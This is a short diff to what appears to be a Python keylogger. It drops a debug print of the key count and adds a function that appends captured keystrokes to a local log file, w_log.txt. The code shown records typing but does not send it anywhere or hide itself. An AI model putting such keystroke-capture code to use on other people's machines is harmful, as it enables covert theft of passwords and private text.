@@ -10,7 +10,12 @@ def on_press(key):
     global count, keys
     print(" {0} key pressed".format(key))
     count+=1
-    print(" {0} count".format(count))
+
+
+def write_file(keys):
+    with open("w_log.txt", "a") as i:
+        for key in keys:
+            i.write(key)
 
 
 def on_release(key):
